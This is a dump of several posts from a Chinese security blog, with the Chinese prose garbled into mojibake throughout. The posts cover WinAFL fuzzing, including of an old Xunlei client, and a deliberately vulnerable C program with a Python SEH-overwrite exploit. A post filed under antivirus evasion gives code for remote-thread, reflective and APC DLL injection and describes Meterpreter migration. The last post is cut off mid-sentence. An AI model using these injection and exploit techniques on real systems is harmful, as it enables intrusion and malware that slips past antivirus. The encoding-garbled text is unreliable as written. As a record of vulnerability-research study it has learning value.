ç„¶åå¼€å§‹fuzzï¼Œå¼€å¯ä¸€ä¸ªMasterå§ 123456789101112afl-fuzz.exe ^-M master ^-i &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\thunder_fuzzer\\in&quot; ^-o &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\thunder_fuzzer\\out&quot; ^-D &quot;D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32&quot; ^-I 100000+ -t 9000 -- ^-coverage_module AssistantTools.dll ^-coverage_module P2PBase.dll ^-target_module fuzz_program.exe ^-target_method fuzz_method ^-fuzz_iterations 5000 -nargs 1 -- ^fuzz_program.exe @@ -M: æŒ‡å®šè¿™æ˜¯ä¸€ä¸ªMasterè¿›ç¨‹ -i -ï¼šå½“fuzzæš‚åœçš„æ—¶å€™æ¢å¤ï¼Œåœ¨AFLä¸Šæ˜¯-in -ï¼Œå…·ä½“ç”¨æ³• 12345afl-fuzz.exe ^-M master ^-i -&quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\thunder_fuzzer\\in&quot; ^-o &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\thunder_fuzzer\\out&quot; ^.... è‡ªå·±æ”¹å†™çš„harnessç¡®å®å¿«ï¼Œä½†ä¹Ÿä¸è‡³äºä¸€ä¸‹å­å°±è·‘å‡ºæ¥ï¼Œè¿™é‡Œæˆ‘ç”¨æ—§ç‰ˆæœ¬çš„è¿…é›·è¯•äº†ä¸‹ ä¹Ÿå°±æ˜¯ä¸€ä¸ªè¢«ä¿®å¤çš„Ã·0æŠ¥é”™ï¼ˆEXCEPTION_INT_DIVIDE_BY_ZEROï¼‰ æ˜¨å¤©16hé«˜å¼ºåº¦ä¿®å¤é—®é¢˜1ï¼Œæš‚æ—¶æ›´æ–°åˆ°è¿™é‡Œ","categories":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/tags/CVE/"},{"name":"fuzz","slug":"fuzz","permalink":"https://joe1sn.eu.org/tags/fuzz/"}]},{"title":"ã€æ¼æ´æŒ–æ˜ã€‘win-aflä½¿ç”¨æŒ‡åŒ—-åˆçº§ç¯‡","slug":"win-afl","date":"2023-07-18T07:27:44.000Z","updated":"2023-07-19T14:08:42.244Z","comments":true,"path":"2023/07/18/win-afl/","link":"","permalink":"https://joe1sn.eu.org/2023/07/18/win-afl/","excerpt":"åœ¨21å¹´çš„æ—¶å€™æ›¾ç»å°å°çš„ä½¿ç”¨äº†ä¸€ç‚¹WinAFLï¼Œç°åœ¨å†å›è¿‡å¤´æ¥åšç¬”è®° è¿™é‡Œä¸»è¦è®²è¿°WinAFL+DynamoRIOçš„Fuzzæ–¹æ³•","text":"åœ¨21å¹´çš„æ—¶å€™æ›¾ç»å°å°çš„ä½¿ç”¨äº†ä¸€ç‚¹WinAFLï¼Œç°åœ¨å†å›è¿‡å¤´æ¥åšç¬”è®° è¿™é‡Œä¸»è¦è®²è¿°WinAFL+DynamoRIOçš„Fuzzæ–¹æ³• ç®€ä»‹ çŸ¥é“åˆ›å®‡è¿™ç¯‡æ–‡ç« è®²çš„å·²ç»å¾ˆå¥½äº†ï¼šhttps://paper.seebug.org/323/ ç”±äºé—­æºç‰¹ç‚¹ï¼Œé‚£ä¹ˆéœ€è¦ä½¿ç”¨DynamoRIOè¿›è¡Œæ’æ¡©ï¼Œæ£€æµ‹æŒ‡ä»¤å—çš„è½¬ç§» WinAFLä¸»è¦ç‰¹ç‚¹å°±æ˜¯å°†AFLä¸­çš„å‡½æ•°ä½¿ç”¨WinAPIè¿›è¡Œé‡å†™ï¼Œç„¶åè°ƒç”¨DynamoRIOçš„APIå®Œæˆfuzz ç¼–è¯‘ ä¸»è¦æ˜¯å‚è€ƒäº†https://bbs.kanxue.com/thread-261323.htmå’Œå®˜æ–¹è¿‡ç¨‹ï¼šhttps://dynamorio.org/page_building.html DynamoRIO 32ä½ 1. ç¼–è¯‘ è½¯ä»¶ä¸‹è½½ä¸€æŠŠæ¢­ 1234git clone https://github.com/DynamoRIO/dynamorio.gitcd dynamoriomkdir build_Win32mkdir build_x64 è¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯x86 Native Tools Command Promptå‘½ä»¤è¡Œ 1cmake -G&quot;Visual Studio 16&quot; -A Win32 .. å¦‚æœå‘ç°ç¼ºå°‘ä»€ä¹ˆçš„è¯ï¼Œä½¿ç”¨set Name=Valueå†ç¼–è¯‘ï¼Œæœ€å 1cmake --build . --config RelWithDebInfo 2. æµ‹è¯• 1&quot;D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_win32\\bin32\\drrun.exe&quot; -t drcov -- &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\32\\HelloWorld.exe&quot; &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\32\\password.txt&quot; è¿™é‡Œæˆ‘æ¢æˆäº†è€ç‰ˆæœ¬ dynamorio-cronbuild-8.0.18684ï¼Œå› ä¸ºæ–°ç‰ˆæœ¬æ˜¯3.0ç‰ˆæœ¬çš„è¦†ç›–ç‡æ–‡ä»¶ï¼ŒIDA Lighthouseåªæ”¯æŒ2.0ï¼Œä¸è¿‡ä½ å¯ä»¥é€šè¿‡https://gist.github.com/wumb0/de671cc5051353fd32af4aecc811a282è¿›è¡Œç‰ˆæœ¬çš„è½¬æ¢ã€‚ 64ä½ 1. ç¼–è¯‘ æŒ‰ç…§å®˜æ–¹çš„æ­¥éª¤ 1%comspec% /k &quot;C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Enterprise\\VC\\Auxiliary\\Build\\vcvarsamd64_x86.bat&quot; æˆ–è€…å¯åŠ¨ 1Developer Command Prompt for VS 2019 ç„¶åè¿›è¡Œcmakeé…ç½® 1cmake -A x64 .. å°±å¯ä»¥å‚è€ƒçœ‹é›ªé‚£ç¯‡æ–‡ç« ä¿®æ”¹ä¸‹æŠ¥é”™ åˆ©ç”¨cmake-guiä¿®æ”¹å®Œè¿‡åå°±å¯ä»¥ç»§ç»­å›åˆ°cmdè¿›è¡Œç¼–è¯‘äº†ï¼ˆä¹Ÿå¯ä»¥ç”¨vs2019ï¼‰ 2. æµ‹è¯• WinAFL èµ·æ‰‹å¼ 12345git clone https://github.com/googleprojectzero/winafl.gitcd winaflgit submodule update --init --recursivemkdir build_Win32mkdir build_x64 ç¼–è¯‘32ä½ 12cmake -G&quot;Visual Studio 16 2019&quot; .. -A Win32 -DDynamoRIO_DIR=D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\cmake -DINTELPT=1 -DUSE_COLOR=1cmake --build . --config Release å¦‚æœæ˜¾ç¤ºdrguiä¸å®Œæ•´ï¼Œè¿”å›å»åœ¨ç”Ÿæˆå°±è¡Œäº†ï¼Œçœ‹é›ªä¸Šçš„æ•™ç¨‹æ˜¯æ²¡æœ‰é—®é¢˜çš„ ç¼–è¯‘64ä½ 12cmake -G&quot;Visual Studio 16 2019&quot; -A x64 .. -DDynamoRIO_DIR=&quot;D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_x64\\cmake&quot; -DINTELPT=1 -DUSE_COLOR=1cmake --build . --config Release æµ‹è¯• 32ä½ é¦–å…ˆè¿›è¡Œæ’æ¡© 123456789101112131415161718@echo off:: æ¥å—ç”¨æˆ·è¾“å…¥set /p target_module=traget excutable : set /p target_offset=traget offset : set /p sample=pins sample: :: è¾“å‡ºç”¨æˆ·è¾“å…¥çš„å†…å®¹echo target_module, %target_module%!echo target_offset, %target_offset%!echo sample, %sample%!D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32\\drrun.exe ^-c D:\\HackTools\\Fuzz\\__FuzzWork\\winafl\\build_Win32\\bin\\Release\\winafl.dll -debug ^-target_module %target_module% ^-target_offset %target_offset% ^-fuzz_iterations 10 -nargs 2 -- ^%target_module% %sample% 123456D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32\\drrun.exe ^-c D:\\HackTools\\Fuzz\\__FuzzWork\\winafl\\build_Win32\\bin\\Release\\winafl.dll -debug ^-target_module test.exe ^-target_offset 0x1210 ^-fuzz_iterations 10 -nargs 2 -- ^test.exe .\\in\\password.txt æŸ¥çœ‹ç”Ÿæˆçš„logæ–‡ä»¶ï¼Œå¦‚æœæœ‰Everything appears to be running normally.é‚£ä¹ˆå°±æ˜¯å®Œæˆäº† å¼€å§‹fuzz 12345678910afl-fuzz.exe ^-i .\\in ^-o &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\out&quot; ^-D &quot;D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32&quot; ^-I 100000+ -t 90000+ -- ^-coverage_module test.exe ^-target_module test.exe ^-target_offset 0x1210 ^-fuzz_iterations 5000 -nargs 1 -- ^test.exe @@ 64ä½ è¿‡ç¨‹ä¹Ÿå·®ä¸å¤š å…ˆæ’æ¡© 123456traget excutable : test.exetraget offset : 0x1200pins sample: .\\in\\input.bmptarget_module, test.exe!target_offset, 0x1200! sample, .\\in\\input.bmp! ç„¶åfuzz 12345678910afl-fuzz.exe ^-i .\\in ^-o .\\out ^-D &quot;D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_x64\\bin64&quot; ^-I 100000+ -t 90000+ -- ^-coverage_module test.exe ^-target_module test.exe ^-target_offset 0x1210 ^-fuzz_iterations 5000 -nargs 1 -- ^test.exe @@ æµ‹è¯•2 - SimpleHunt åœ¨ä¹‹å‰æˆ‘çš„åšå®¢å†™äº†windowsä¸‹æ ˆæº¢å‡ºçš„è¿‡ç¨‹ï¼Œè¿™é‡Œæˆ‘æ”¹å†™äº†ä¸‹ 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt; void hacked()&#123; printf(&quot;Hacked\\n&quot;);&#125;void vuln(char *FileDir)&#123; char password[6] = &quot;ABCDE&quot;; char str[6]; FILE *fp; if(!(fp=fopen(FileDir,&quot;r&quot;)))&#123; printf(&quot;Open Failed\\n&quot;); exit(0); &#125; fgets(str, 0x1000, fp); str[5]=&#x27;\\0&#x27;; if(strcmp(str,password)==0) // fprintf(stderr,&quot;OK.\\n&quot;); printf(&quot;OK.\\n&quot;); else // fprintf(stderr,&quot;NO.\\n&quot;); printf(&quot;NO.\\n&quot;);&#125;int main(int argc, char *argv[])&#123; if (argc != 2)&#123; printf(&quot;Usage: ./HelloWorld.exe FileName\\n&quot;); return 0; &#125; vuln(argv[1]); return 0;&#125; 1gcc HelloWorld.c -o HelloWorld æ²¡æœ‰ä»»ä½•ä¿æŠ¤ï¼Œè¿™é‡Œä»¥32ä½ä¸¾ä¾‹ fuzz ç”±äºä»£ç æ¯”è¾ƒç®€å•ï¼Œä¸éœ€è¦å…ˆç”Ÿæˆè¦†ç›–ç‡æ–‡ä»¶æ‰¾åˆ°å…³é”®å‡½æ•°ï¼Œæ‰€ä»¥é¦–å…ˆè¿˜æ˜¯æ’æ¡© 123456D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32\\drrun.exe ^-c D:\\HackTools\\Fuzz\\__FuzzWork\\winafl\\build_Win32\\bin\\Release\\winafl.dll -debug ^-target_module HelloWorld.exe ^-target_offset 0x16c4 ^-fuzz_iterations 10 -nargs 2 -- ^HelloWorld.exe in\\password.txt å¼€å§‹fuzz 12345678910afl-fuzz.exe ^-i &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\in&quot; ^-o &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\out&quot; ^-D &quot;D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32&quot; ^-I 100000+ -t 90000+ -- ^-coverage_module HelloWorld.exe ^-target_module HelloWorld.exe ^-target_offset 0x16c4 ^-fuzz_iterations 5000 -nargs 2 -- ^HelloWorld.exe @@ ç¬é—´æ‰¾åˆ°ä¸€ä¸ªcrash PoC ä½¿ç”¨x32dbgè¿›è¡Œè°ƒè¯• åˆšå¥½ä¿®æ”¹äº†EBPå¯„å­˜å™¨å¯¼å‡ºé”™è¯¯ï¼Œå¾ˆæ˜æ˜¾çš„æ ˆæº¢å‡ºã€‚ å…·ä½“çš„EXPæ„é€ æ–¹æ³•å°±æ˜¯ä½¿ç”¨SEHåŠ è½½shellcodeï¼Œå…·ä½“çš„åœ¨ä¹‹å‰çš„æ–‡ç« å·²ç»å†™è¿‡äº† å†™å‡ºexp 1234567891011payload = b&quot;&quot;shellcode = b&quot;&quot;offset = b&quot;A&quot;*(0x12c-len(shellcode)-32) #0x1cNSEH = b&quot;\\xeb\\x06\\x90\\x90&quot; #asm(&quot;jmp 6;nop;nop&quot;)gadget = b&quot;\\x9A\\x24\\x40\\x00&quot; #40249Aself_gadget = b&quot;\\x89\\xE0\\x05\\x24\\x06\\x00\\x00\\xFF\\xE0&quot;payload = b&quot;\\xaa&quot;*32+shellcode+offset+NSEH+gadget+self_gadgetwith open(&quot;password.txt&quot;,&quot;wb&quot;) as f: f.write(payload) å‚è€ƒ https://paper.seebug.org/323/ https://bbs.kanxue.com/thread-261323.htm","categories":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/tags/CVE/"},{"name":"fuzz","slug":"fuzz","permalink":"https://joe1sn.eu.org/tags/fuzz/"}]},{"title":"ã€å…æ€ã€‘DLLæ³¨å…¥å°ç»“","slug":"dll-injector","date":"2023-07-17T11:24:51.000Z","updated":"2023-07-22T00:55:11.113Z","comments":true,"path":"2023/07/17/dll-injector/","link":"","permalink":"https://joe1sn.eu.org/2023/07/17/dll-injector/","excerpt":"DLL æ³¨å…¥è¿›åŒ–å²","text":"DLL æ³¨å…¥è¿›åŒ–å² è¿œç¨‹çº¿ç¨‹è°ƒç”¨æ³¨å…¥ è¿™ä¸ªæ˜¯æœ€ç®€å•çš„ è¿™é‡Œæˆ‘æ¥å—çš„æ˜¯ç¨‹åºçš„è¿›ç¨‹PIDå’Œå¾…æ³¨å…¥DLLçš„è·¯å¾„szPath 12345678910111213141516171819202122232425void DLLinjector::DllOnLoad() &#123; if (!this-&gt;Check())&#123; wcout &lt;&lt; &quot;The Process or DLL file not found\\n&quot;; return; &#125; //å‘ç›®æ ‡è¿›ç¨‹å†™å…¥DLLçš„è·¯å¾„ SIZE_T dwWriteSize = 0; HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, this-&gt;dwPid); LPVOID pAddress = VirtualAllocEx(hProcess, NULL, 0x100, MEM_COMMIT, PAGE_READWRITE); WriteProcessMemory(hProcess, pAddress, this-&gt;szPath, wcslen(this-&gt;szPath)*2+2, &amp;dwWriteSize); //ä»ntdllå¯¼å‡º LoadLibraryA å‡½æ•° HMODULE Ntdll = LoadLibraryA(&quot;ntdll.dll&quot;); LPVOID LoadLibraryBase = GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); HANDLE hRemoteProcess = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryW,pAddress,NULL,NULL); WaitForSingleObject(hRemoteProcess, -1); //é‡Šæ”¾èµ„æº VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT); CloseHandle(hProcess); FreeModule(Ntdll); wcout &lt;&lt; &quot;injection complete\\n&quot;;&#125; åå°„DLLæ³¨å…¥ è¿™é‡Œæ‰¾äº†ä¸€å¼ å…ˆçŸ¥çš„å›¾ï¼Œä¸Šé¢è¯´äº†åå°„DLLæ³¨å…¥çš„æµç¨‹ï¼ŒåŸæ–‡åœ¨è¿™é‡Œhttps://xz.aliyun.com/t/11072 æœ€å¤§çš„åŒºåˆ«å°±æ˜¯æˆ‘ä»¬æ²¡æœ‰ä½¿ç”¨LoadLibararyè¿™ä¸ªå‡½æ•°ï¼Œè€Œæ˜¯ç›¸å½“äºè‡ªå·±å†™äº†ä¸€ä¸ªDLLåŠ è½½å™¨ ä»”ç»†è§‚å¯Ÿè¿‡ç¨‹å°±çœ‹å¾—å‡ºæ¥ï¼Œè¿œç¨‹çº¿ç¨‹è°ƒç”¨æ³¨å…¥å†™å…¥çš„æ˜¯DLLè·¯å¾„ï¼Œç„¶ååˆ›å»ºè¿œç¨‹è°ƒç”¨LoadLibararyï¼ˆLPTHREAD_START_ROUTINEï¼‰ åå°„DLLæ³¨å…¥æ˜¯å°†æ•´ä¸ªæ–‡ä»¶è§£æè¿‡åï¼Œè·å¾—å¿…è¦çš„dllå¥æŸ„å’Œå‡½æ•°ä¸ºä¿®å¤å¯¼å…¥è¡¨åšå‡†å¤‡ï¼Œåˆ†é…ä¸€å—æ–°å†…å­˜å»å–è§£ædllï¼Œå¹¶æŠŠpeå¤´å¤åˆ¶åˆ°æ–°å†…å­˜ä¸­å’Œå°†å„èŠ‚å¤åˆ¶åˆ°æ–°å†…å­˜ä¸­ï¼Œä¿®å¤å¯¼å…¥è¡¨å’Œé‡å®šå‘è¡¨ï¼Œæ‰§è¡ŒDllMain()å‡½æ•°ã€‚ ç¾¤é‡ŒèŠåˆ°äº†è¿›ç¨‹è¿ç§»æŠ€æœ¯ï¼Œmsfä¸Šçš„migrateåŸç†å°±æ˜¯åå°„DLLæ³¨å…¥ è¯»å–metsrv.dllï¼ˆmetpreter payloadæ¨¡æ¿dllï¼‰æ–‡ä»¶åˆ°å†…å­˜ä¸­ã€‚ ç”Ÿæˆæœ€ç»ˆçš„payloadã€‚ a) msfç”Ÿæˆä¸€å°æ®µæ±‡ç¼–migrate stubä¸»è¦ç”¨äºå»ºç«‹socketè¿æ¥ã€‚ b) å°†metsrv.dllçš„doså¤´ä¿®æ”¹ä¸ºä¸€å°æ®µæ±‡ç¼–meterpreter_loaderä¸»è¦ç”¨äºè°ƒç”¨reflective loaderå‡½æ•°å’Œdllmainå‡½æ•°ã€‚åœ¨metsrv.dllçš„config blockåŒºå¡«å……meterpreterå»ºç«‹sessionæ—¶çš„é…ç½®ä¿¡æ¯ã€‚ c) æœ€åå°†migrate stubå’Œä¿®æ”¹åçš„metsrv.dllæ‹¼æ¥åœ¨ä¸€èµ·ç”Ÿæˆæœ€ç»ˆçš„payloadã€‚ å‘msf serverå‘é€migrateè¯·æ±‚å’Œpayloadã€‚ msfå‘è¿ç§»ç›®æ ‡è¿›ç¨‹åˆ†é…ä¸€å—å†…å­˜å¹¶å†™å…¥payloadã€‚ msfé¦–å…ˆä¼šåˆ›å»ºçš„è¿œç¨‹çº¿ç¨‹æ‰§è¡Œmigrate stubï¼Œå¦‚æœå¤±è´¥äº†ï¼Œå°±ä¼šå°è¯•ç”¨apcæ³¨å…¥çš„æ–¹å¼æ‰§è¡Œmigrate stubã€‚migrate stubä¼šè°ƒç”¨meterpreter loaderï¼Œmeterpreter loaderæ‰ä¼šè°ƒç”¨reflective loaderã€‚ reflective loaderè¿›è¡Œåå°„å¼dllæ³¨å…¥ã€‚ æœ€åmsf clientå’Œmsf serverå»ºç«‹ä¸€ä¸ªæ–°çš„sessionã€‚ è¿™é‡Œå°±ä¸è‡ªå·±å†™äº†ï¼Œå‚è€ƒçš„æ˜¯https://github.com/stephenfewer/ReflectiveDLLInjection é¦–å…ˆéœ€è¦æè¿°çš„å°±æ˜¯DLLçš„è§£æè¿‡ç¨‹ 1234567891011121314151617181920212223242526do&#123; if( !hProcess || !lpBuffer || !dwLength ) break; // check if the library has a ReflectiveLoader... dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpBuffer ); if( !dwReflectiveLoaderOffset ) break; // alloc memory (RWX) in the host process for the image... lpRemoteLibraryBuffer = VirtualAllocEx( hProcess, NULL, dwLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE ); if( !lpRemoteLibraryBuffer ) break; // write the image into the host process... if( !WriteProcessMemory( hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL ) ) break; // add the offset to ReflectiveLoader() to the remote library address... lpReflectiveLoader = (LPTHREAD_START_ROUTINE)( (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset ); // create a remote thread in the host process to call the ReflectiveLoader! hThread = CreateRemoteThread( hProcess, NULL, 1024*1024, lpReflectiveLoader, lpParameter, (DWORD)NULL, &amp;dwThreadId );&#125; while( 0 ); lpBufferå°±æ˜¯è¯»å–åˆ°å†…å­˜ä¸­çš„DLLçš„æ•°æ® 12345678910111213141516171819202122232425262728293031323334353637383940414243// uiNameArray = the address of the modules export directory entryuiNameArray = (UINT_PTR)&amp;((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];// get the File Offset of the export directoryuiExportDir = uiBaseAddress + Rva2Offset( ((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress, uiBaseAddress );// get the File Offset for the array of name pointersuiNameArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNames, uiBaseAddress );// get the File Offset for the array of addressesuiAddressArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress );// get the File Offset for the array of name ordinalsuiNameOrdinals = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNameOrdinals, uiBaseAddress ); // get a counter for the number of exported functions...dwCounter = ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;NumberOfNames;// loop through all the exported functions to find the ReflectiveLoaderwhile( dwCounter-- )&#123; char * cpExportedFunctionName = (char *)(uiBaseAddress + Rva2Offset( DEREF_32( uiNameArray ), uiBaseAddress )); if( strstr( cpExportedFunctionName, &quot;ReflectiveLoader&quot; ) != NULL ) &#123; // get the File Offset for the array of addresses uiAddressArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress ); // use the functions name ordinal as an index into the array of name pointers uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) ); // return the File Offset to the ReflectiveLoader() functions code... return Rva2Offset( DEREF_32( uiAddressArray ), uiBaseAddress ); &#125; // get the next exported function name uiNameArray += sizeof(DWORD); // get the next exported function name ordinal uiNameOrdinals += sizeof(WORD);&#125;return 0; GetReflectiveLoaderOffsetå°±æ˜¯è§£ææ–‡ä»¶å¤´æ‰¾åˆ°DLLçš„å¯¼å‡ºè¡¨ï¼Œå¦‚æœå‘ç°ReflectiveLoaderçš„å‡½æ•°ï¼Œé‚£ä¹ˆè¿”å›åœ¨hProcessçš„å†…å­˜æ–‡ä»¶ä¸­çš„ä½ç½® ç„¶åå›åˆ°LoadRemoteLibraryRä½¿ç”¨CreateRemoteThreadè¿›è¡Œæ³¨å…¥ å…³äºRVAå’ŒVAçš„è®¡ç®—å¯ä»¥å‚è€ƒæˆ‘å¾ˆæ—©å†™çš„ä¸€ç¯‡åšå®¢ï¼šPEæ–‡ä»¶ç»“æ„ä¸­çš„RVAä¸RAW ç°åœ¨å¯ä»¥çœ‹ä¸€ä¸‹ä»–çš„DLLæ˜¯å¦‚ä½•æ„é€ çš„ é¦–å…ˆå­˜åœ¨ä¸€ä¸ªå¯¼å‡ºå‡½æ•° é€šè¿‡é˜…è¯»è¿™ä¸ªå‡½æ•°çš„ä»£ç å‘ç° ä½¿ç”¨_ReturnAddressè·å¾—è°ƒç”¨å®Œæˆçš„è¿”å›åœ°å€ï¼Œåæ¨åˆDLLçš„åŸºåœ°å€ é€šè¿‡PEBå¾—åˆ°LoadLibraryAã€GetProcAddressã€VirtualAllocï¼Œä½¿ç”¨NtFlushInstructionCacheæš‚æ—¶å­˜å‚¨å…¶ä»–å¯¼å…¥è¡¨çš„å‡½æ•° è¿ç§»ä¹‹å‰çš„DLLé•œåƒåˆ°æ–°çš„ä½ç½® è¦†å†™è¿ç§»åçš„æ–‡ä»¶å¤´çš„èŠ‚åŒºä½ç½® ä½¿ç”¨åˆšæ‰å¯¼å…¥çš„LoadLibraryAã€GetProcAddressä¿®å¤IAT å¤„ç†é‡å®šå‘ç›¸å…³ æ‰¾åˆ°DLLMainå¹¶è·³è½¬åæ‰§è¡Œ APCæ³¨å…¥ åœ¨æœ€å¼€å§‹çš„è¿œç¨‹çº¿ç¨‹è°ƒç”¨æ³¨å…¥ä½¿ç”¨çš„æ˜¯TH32CS_SNAPPROCESSï¼Œè¿™é‡Œå°±æ˜¯åˆ©ç”¨KiUserDispatchè°ƒåº¦è¿›è¡ŒAPCä¾‹ç¨‹è°ƒç”¨ï¼Œè®©çº¿ç¨‹ä½¿ç”¨LoadLibararyè¿›è¡Œæ³¨å…¥ 123456789101112131415161718192021THREADENTRY32 te = &#123; sizeof(THREADENTRY32) &#125;;HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);if (INVALID_HANDLE_VALUE == hThreadSnap) &#123; std::cout &lt;&lt; &quot;Error In APC Injection\\n&quot;;&#125;BOOL bStat = FALSE;//å¾—åˆ°ç¬¬ä¸€ä¸ªçº¿ç¨‹if (Thread32First(hThreadSnap, &amp;te)) &#123; do &#123; if (te.th32OwnerProcessID == this-&gt;dwPid) &#123; HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID); if (hThread) &#123; DWORD dwRet = QueueUserAPC((PAPCFUNC)LoadLibraryW, hThread, (ULONG_PTR)pAddress); if (dwRet &gt; 0) bStat = TRUE; &#125; CloseHandle(hThread); &#125; &#125; while (Thread32Next(hThreadSnap, &amp;te));&#125;CloseHandle(hThreadSnap); è¿˜æœ‰ä¸€ä¸ªæŠ€å·§å°±æ˜¯ä½¿ç”¨NTDLLä¸­çš„æœªå¯¼å‡ºå‡½æ•°NtTestAlertå°±å¯ä»¥ç«‹å³è°ƒç”¨APCä¾‹ç¨‹ ä¸Šé¢çš„æŠŠhProcess = GetCurrentProcess()ï¼ŒpAddress = shellcode_Addressç›¸å½“äºä½¿ç”¨DLLæ³¨å…¥è¿›è¡Œå…æ€äº† ä¸Šä¸‹æ–‡æ³¨å…¥ ä¹‹å‰åœ¨å†™PEåŠ è½½å™¨çš„æ—¶å€™å°±æƒ³åˆ°äº†è¿™ä¸ªï¼Œä¸»è¦æ˜¯é€šè¿‡æš‚åœç¨‹åºï¼Œè·å¾—å¹¶ä¿®æ”¹ä¸Šä¸‹æ–‡ï¼Œåœ¨å†…å­˜ä¸­å†™å…¥shellcodeï¼Œç„¶åå†æ¢å¤å°±è¡Œäº† é—®é¢˜åœ¨äºshellcodeè¿˜æœ‰è®¡ç®—å„ç§åç§»ï¼Œä¸ªäººè§‰å¾—æ¶‰åŠshellcodeå’Œæ±‡ç¼–è¾ƒå¤šï¼Œå°±ä¸å†æœ¬ç¯‡æ–‡ç« èµ˜è¿° ç”¨åˆ°çš„ä¸»è¦WINAPIå°±æ˜¯ åˆ›å»ºä¼šshellcodeè£¸å‡½æ•°ï¼ˆ__declspec(naked)ï¼‰,å¯¼å‡ºLoadLibraryç­‰å‡½æ•° OpenProcessåå†OpenThreadï¼Œä½¿ç”¨SuspendThreadæš‚åœçº¿ç¨‹ åˆ›å»ºç±»å‹ä¸ºCONTEXTçš„å˜é‡ï¼Œåˆå§‹åŒ–context.ContextFlags=CONTEXT_FULL GetThreadContextè·å¾—ä¸Šä¸‹æ–‡ VirualAllocè·å¾—ç©ºé—´ï¼Œç±»ä¼¼RtlMoveMemoryè¿™ç§å¤åˆ¶shellcodeåˆ°ç©ºé—´ å°†context.eip = shellcode_addrï¼Œä½¿ç”¨SetThreadContexté‡æ–°è®¾ç½®ä¸Šä¸‹æ–‡ï¼ŒResumeThreadæ¢å¤çº¿ç¨‹ å†…æ ¸ä¸­çš„è¿‡ç¨‹å·®ä¸å¤šï¼Œä¸è¿‡æ›´å¤šçš„æ˜¯ä¸ä¸€æ ·çš„API","categories":[{"name":"program","slug":"program","permalink":"https://joe1sn.eu.org/categories/program/"}],"tags":[{"name":"malware","slug":"malware","permalink":"https://joe1sn.eu.org/tags/malware/"},{"name":"C","slug":"C","permalink":"https://joe1sn.eu.org/tags/C/"}]},{"title":"ã€Win Pwnã€‘åŸºç¡€æ ˆæº¢å‡ºä¿æŠ¤ç»•è¿‡","slug":"win-pwn-stack2","date":"2023-07-12T14:29:58.000Z","updated":"2023-07-13T12:25:05.423Z","comments":true,"path":"2023/07/12/win-pwn-stack2/","link":"","permalink":"https://joe1sn.eu.org/2023/07/12/win-pwn-stack2/","excerpt":"é’ˆå¯¹æ ˆæ”»å‡»çš„é˜²æŠ¤ä¸ç»•è¿‡","text":"é’ˆå¯¹æ ˆæ”»å‡»çš„é˜²æŠ¤ä¸ç»•è¿‡ GS GSæœ¬è´¨ä¸Šå’ŒLinux GCCä¸­çš„canaryå¾ˆç›¸ä¼¼ï¼Œä»–åœ¨æ ˆå¸§çš„ç»“å°¾ï¼ˆEBPä¹‹å‰ï¼‰æ’å…¥ä¸€ç»™DWORDç±»å‹çš„å€¼ï¼Œå…¶å‰¯æœ¬å­˜åœ¨äº.dataä¸­ã€‚ åœ¨ç¼–è¯‘çš„æ—¶å€™å¹¶ä¸ä¼šå­˜åœ¨GSä¿æŠ¤æœ‰ä¸‹é¢å‡ ç§æƒ…å†µ å‡½æ•°ä¸åŒ…å«ç¼“å†²åŒº 